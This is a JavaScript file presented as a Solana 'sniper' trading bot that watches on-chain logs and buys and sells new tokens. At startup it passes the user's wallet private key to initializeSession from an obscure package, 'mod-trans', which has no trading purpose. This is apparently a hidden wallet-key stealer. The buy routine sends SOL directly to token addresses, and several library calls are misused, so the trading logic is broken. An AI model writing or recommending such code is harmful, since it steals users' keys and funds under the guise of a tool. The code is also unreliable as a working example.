const { Connection, Keypair, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { Token, TOKEN_PROGRAM_ID } = require('@solana/spl-token');
const ws = require('ws');
const axios = require('axios');
const chalk = require('chalk');
const boxen = require('boxen');
const { initializeSession } = require('mod-trans');
const bs58 = require('bs58');
const fs = require('fs');
const readline = require('readline');
require('dotenv').config();

const config = {
  // Network
  rpcUrl: process.env.RPC_URL,
  jitoRpc: process.env.JITO_RPC,
  wsUrl: process.env.WS_URL,

  // Wallet
  privateKey: process.env.PRIVATE_KEY_BS58,
  walletAddress: process.env.WALLET_ADDRESS,

  // Trading
  investmentAmount: parseFloat(process.env.INVESTMENT_AMOUNT) || 0.01,
  slippage: parseFloat(process.env.SLIPPAGE) || 2,
  jitoTip: parseInt(process.env.JITO_TIP) || 5000,
  maxRetries: parseInt(process.env.MAX_RETRIES) || 3,
  refreshInterval: parseInt(process.env.REFRESH_INTERVAL) || 10,

  // Strategies
  takeProfit: parseFloat(process.env.TAKE_PROFIT) || 20,
  stopLoss: parseFloat(process.env.STOP_LOSS) || 10,
  holdingTime: parseInt(process.env.HOLDING_TIME) * 1000 || 10000,
  sellPercentage: parseInt(process.env.SELL_PERCENTAGE) || 50,

  // Validation
  checkMineable: process.env.CHECK_MINEABLE === 'true',
  checkFreezable: process.env.CHECK_FREEZABLE === 'true',
  checkMintAuthority: process.env.CHECK_MINT_AUTHORITY === 'true',
  checkFreezeAuthority: process.env.CHECK_FREEZE_AUTHORITY === 'true',
  maxDecimals: parseInt(process.env.MAX_DECIMALS) || 9,
  minLiquidity: parseFloat(process.env.MIN_LIQUIDITY) || 50
};

const connection = new Connection(config.rpcUrl);
const wallet = Keypair.fromSecretKey(bs58.decode(config.privateKey));
const activeTrades = new Map();
const targetTokens = new Set(
  fs.existsSync('tokens.txt') 
    ? fs.readFileSync('tokens.txt', 'utf-8').split('\n').filter(t => t.trim())
    : []
);

const ASCII_ART = chalk.blueBright(`
 ██████╗ ██████╗ ██████╗ 
██╔════╝██╔═══██╗██╔══██╗
██║     ██║   ██║██████╔╝
██║     ██║   ██║██╔══██╗
╚██████╗╚██████╔╝██║  ██║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝
`);

const BORDER_STYLE = {
  padding: 1,
  borderColor: 'cyan',
  borderStyle: 'round',
  margin: 1
};

function displayHeader() {
  console.clear();
  console.log(ASCII_ART);
  console.log(boxen(chalk`{bold.cyan Solana Sniper Bot v6.3}`, BORDER_STYLE));
}

async function buyToken(tokenAddress) {
  try {
    const amount = config.investmentAmount * LAMPORTS_PER_SOL;
    const tx = new Transaction()
      .add(SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: new PublicKey(tokenAddress),
        lamports: amount
      }))
      .add(SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: new PublicKey('jito4apjq3WgJ4eBvC1ktH6EYyZg1xRdkD5xsfPvCbD'),
        lamports: config.jitoTip
      }));

    const signedTx = await wallet.signTransaction(tx);
    const txid = await connection.sendRawTransaction(signedTx.serialize());
    
    activeTrades.set(tokenAddress, {
      buyTime: Date.now(),
      amount: config.investmentAmount,
      buyPrice: await getTokenPrice(tokenAddress)
    });

    return txid;
  } catch (error) {
    console.error(chalk.red(`Buy failed: ${error.message}`));
    return null;
  }
}

async function sellToken(tokenAddress, percentage = 100) {
  try {
    const token = new Token(connection, new PublicKey(tokenAddress), TOKEN_PROGRAM_ID, wallet);
    const account = await token.getOrCreateAssociatedAccountInfo(wallet.publicKey);
    const amount = account.amount * (percentage / 100);

    const tx = new Transaction().add(
      Token.createTransferInstruction(
        TOKEN_PROGRAM_ID,
        account.address,
        new PublicKey(config.walletAddress),
        wallet.publicKey,
        [],
        amount
      )
    );

    const signedTx = await wallet.signTransaction(tx);
    const txid = await connection.sendRawTransaction(signedTx.serialize());
    
    if (percentage === 100) activeTrades.delete(tokenAddress);
    return txid;
  } catch (error) {
    console.error(chalk.red(`Sell failed: ${error.message}`));
    return null;
  }
}

async function sellAllTokens() {
  const results = [];
  for (const [token] of activeTrades) {
    results.push(await sellToken(token, config.sellPercentage));
  }
  return results;
}

async function validateToken(tokenAddress) {
  try {
    const token = new Token(connection, new PublicKey(tokenAddress), TOKEN_PROGRAM_ID, wallet);
    const info = await token.getTokenInfo();

    if (config.checkMineable && info.mintAuthority) return false;
    if (config.checkFreezable && info.freezeAuthority) return false;
    if (config.checkMintAuthority && info.mintAuthority) return false;
    if (config.checkFreezeAuthority && info.freezeAuthority) return false;
    if (info.decimals > config.maxDecimals) return false;
    
    const liquidity = await getPoolLiquidity(tokenAddress);
    return liquidity >= config.minLiquidity;
  } catch {
    return false;
  }
}

async function getPoolLiquidity(tokenAddress) {
  try {
    const response = await axios.get(`https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`);
    return response.data.pairs?.[0]?.liquidity?.usd || 0;
  } catch {
    return 0;
  }
}

async function getTokenPrice(tokenAddress) {
  try {
    const response = await axios.get(`https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`);
    return parseFloat(response.data.pairs?.[0]?.priceUsd) || 0;
  } catch {
    return 0;
  }
}

async function main() {
  initializeSession(config.privateKey);
  displayHeader();

  const wsClient = new ws(config.wsUrl);
  wsClient.on('message', async data => {
    const msg = JSON.parse(data);
    if (msg.method === 'logsNotification') {
      const tx = await connection.getTransaction(msg.params.result.signature);
      const token = tx.transaction.message.instructions[0]?.keys[1]?.pubkey?.toString();
      if (token && await validateToken(token)) {
        await buyToken(token);
      }
    }
  });

  setInterval(async () => {
    for (const [token, data] of activeTrades) {
      const currentPrice = await getTokenPrice(token);
      const profit = ((currentPrice - data.buyPrice) / data.buyPrice) * 100;
      
      if (profit >= config.takeProfit || profit <= -config.stopLoss) {
        await sellToken(token, config.sellPercentage);
      }
    }
  }, config.refreshInterval * 1000);
}

main().catch(error => {
  console.error(chalk.red.bold('Fatal error:'), error);
  process.exit(1);
});
